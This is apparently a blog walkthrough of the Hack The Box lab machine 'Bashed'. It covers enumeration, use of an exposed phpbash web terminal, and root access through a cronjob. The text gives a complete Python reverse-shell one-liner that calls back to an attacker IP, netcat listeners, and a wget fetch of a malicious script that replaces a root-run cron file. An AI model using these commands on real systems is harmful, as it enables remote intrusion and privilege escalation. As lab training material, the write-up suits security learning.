I"P#<p>In Bashed, we’ll find a hidden directory where we’ll have access to a bash terminal through a web browser. We’ll use this bash terminal to gain access to the box by creating a reverse shell (x2!) to gain root access, without using Metasploit. So let’s get started.</p>

<h2 id="hack-the-box">Hack The Box</h2>

<ul>
  <li>Operating System: Linux</li>
  <li>Difficulty: Easy</li>
</ul>

<h2 id="enumeration">Enumeration</h2>

<p>Enumeration begins with the classic nmap scan.</p>

<p><img src="/images/blog/bashed/nmapscan.jpg" alt="nmap scan" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
</pre></td></tr></tbody></table></code></pre></div></div>

<p>From the results, we know that port 80 is open. So let’s start investigating.</p>

<h3 id="website-information">Website Information</h3>

<p>The first thing we can do is go to the web browser and enter <strong>10.10.10.68</strong>.</p>

<p><img src="/images/blog/bashed/website.jpg" alt="web page of 10.10.10.68" /></p>

<p>After investigating the webpage, it looks like it’s some sort of blog that talks about phpbash. Nothing interesting. Checked in the source code and ran Burp Suite, nothing interesting in there either.</p>

<p>The next step is to run DirBuster to see if we can find any hidden directories.</p>

<h3 id="dirbuster">DirBuster</h3>

<p>To run DirBuster, we can type <code class="language-plaintext highlighter-rouge">dirbuster</code> in the Kali Linux terminal. DirBuster should automatically open. For this scan, I selected the wordlist file:</p>

<p><strong>/usr/shared/wordlists/dirbuster/directory-list-2.3-medium.txt</strong></p>

<p><img src="/images/blog/bashed/dirbuster.jpg" alt="DirBuster results" /></p>

<p>Interestingly, we can see that there’s a /dev directory that’s available and within it has phpbash.php. Let’s go ahead and access that directory within the web browser by typing:</p>

<p><strong>http://10.10.10.68/dev/phpbash.php</strong></p>

<p>Oh, it like we have access to a bash terminal. We can do some more enumerating by typing:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">whoami</code> = prints the userid (currently www-data)</li>
  <li><code class="language-plaintext highlighter-rouge">uname -a</code> = prints system information</li>
  <li><code class="language-plaintext highlighter-rouge">sudo -l</code> = tells us what permissions we have</li>
</ul>

<p><img src="/images/blog/bashed/phpbash.jpg" alt="bash terminal" /></p>

<p>We can see in the second to last line that we can run commands as <strong>scriptmanager</strong> without needing to enter in a password, that might come in handy later.</p>

<p>From the bash terminal we can also navigate throughout the system (FYI, you can find the user.txt file), I navigated to the root directory and found that there was a scripts directory in there–don’t usually see a scripts directory in there.</p>

<p>So we can use the <code class="language-plaintext highlighter-rouge">ls -la</code> command to see a bit more about the file permissions. The image below shows that the user scriptmanager owns and has access to the scripts directory.</p>

<p><img src="/images/blog/bashed/directory.jpg" alt="scripts directory" /></p>

<p>Since we know from above that we can login as scriptmanager, I tried to switch users but it didn’t work. In this scenario, since we can’t switch users, it means that the bash terminal can only accept one command at a time, so we’ll need to complete a reverse shell to gain access.</p>

<p>To gain a reverse shell, we need to find out which code the computer can accept. In this case, I’ve confirmed that this box accepts python by typing <code class="language-plaintext highlighter-rouge">which python</code>. This command tells us the location of the executables, and because it printed the path for python, we know that python is installed.</p>

<p>I think we have enough information to exploit the box, so let’s give it a try.</p>

<h2 id="exploitation">Exploitation</h2>

<p>Before we start exploiting the box, let’s recap what we found during the enumeration phase:</p>

<ul>
  <li>In the nmap scan we saw that port 80 was open.</li>
  <li>After running DirBuster, we found /dev/phpbash.php</li>
  <li>By typing <code class="language-plaintext highlighter-rouge">sudo -l</code> we found out that we can log in as scriptmanager.</li>
  <li>The scriptmanager user has access to a scripts directory.</li>
  <li>Confirmed that the box can read python.</li>
</ul>

<p>Now that we’ve confirmed the above, let’s start the exploitation phase.</p>

<h3 id="gaining-reverse-shell">Gaining Reverse Shell</h3>

<p>I used <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey’s Reverse Shell Cheat Sheet</a> to find a python script that we can use.</p>

<p>Before using it, in a Kali terminal we’ll want to start a Netcat listener:</p>

<p><code class="language-plaintext highlighter-rouge">nc -lnvp 4444</code></p>

<p>And then in the Bash terminal I typed in:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.31",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Success! If we head back to the Kali terminal we should see that we now have a reverse shell.</p>

<p><img src="/images/blog/bashed/reverseshell.jpg" alt="reverse shell" /></p>

<p>Because we’re currently logged in as www-data, we can switch users to scriptmanager by typing in:</p>

<p><code class="language-plaintext highlighter-rouge">sudo -i -u scriptmanager</code></p>

<p>Once we’ve logged in we can go back to the scripts directory to see what’s in there. As a habit, I like to type in <code class="language-plaintext highlighter-rouge">ls -la</code> to find out more information about the files within the directory.</p>

<p><img src="/images/blog/bashed/scripts.jpg" alt="scripts directory" /></p>

<p>In the image above, we can see that we have read/write access to a <strong>test.py</strong> file. Upon closer inspection, it also looks like the time noted in the <strong>test.txt</strong> increases every minute, so it’s likely that the test.txt file is on cronjob to execute the test.py file. We can probably use this to our advantage and complete a privilege escalation to gain root access.</p>

<h3 id="privilege-escalation">Privilege Escalation</h3>

<p>The first thing I did was create another <strong>test.py</strong> script on the Kali machine but edited it so that it has the script to create a reverse shell using python.</p>

<p><img src="/images/blog/bashed/test.jpg" alt="test script" /></p>

<p>Before saving, make sure to remember the port number (in the image above, I used 4444) since we will be using it when we create another Netcat listener.</p>

<p>Next, I created:</p>

<ul>
  <li>On Kali machine: <code class="language-plaintext highlighter-rouge">nv -lnvp 4444</code></li>
  <li>On Bashed machine: <code class="language-plaintext highlighter-rouge">wget http://10.10.14.31:4444/test.py</code></li>
</ul>

<p>Now if we go into the Bashed terminal, we can see that it downloaded the file.</p>

<p>Afterwards, I removed the old test.py by using the <code class="language-plaintext highlighter-rouge">rm</code> command and renamed the new file so that it says test.py instead of test.py.1 by using the <code class="language-plaintext highlighter-rouge">mv</code> command.</p>

<p>Next, in the Kali machine, I created another listener <code class="language-plaintext highlighter-rouge">nc -lnvp 4444</code> (the same port number mentioned in the script) and waited for the cronjob to run. FYI, you can’t run it yourself. You have to wait for the cronjob to complete or else you will not gain root access.</p>

<p><img src="/images/blog/bashed/root.jpg" alt="root access" /></p>

<p>Yes! We did it. To confirm we can type in the <code class="language-plaintext highlighter-rouge">id</code> command to make sure we have root access.</p>

<h2 id="conclusion">Conclusion</h2>

<p>If it wasn’t obvious, having access to a bash terminal through a webpage is probably not the best way to keep a webpage secure. It was pretty easy to gain a reverse shell and then complete a privilege escalation to gain root access. So, don’t have your bash terminals public everyone!</p>
:ET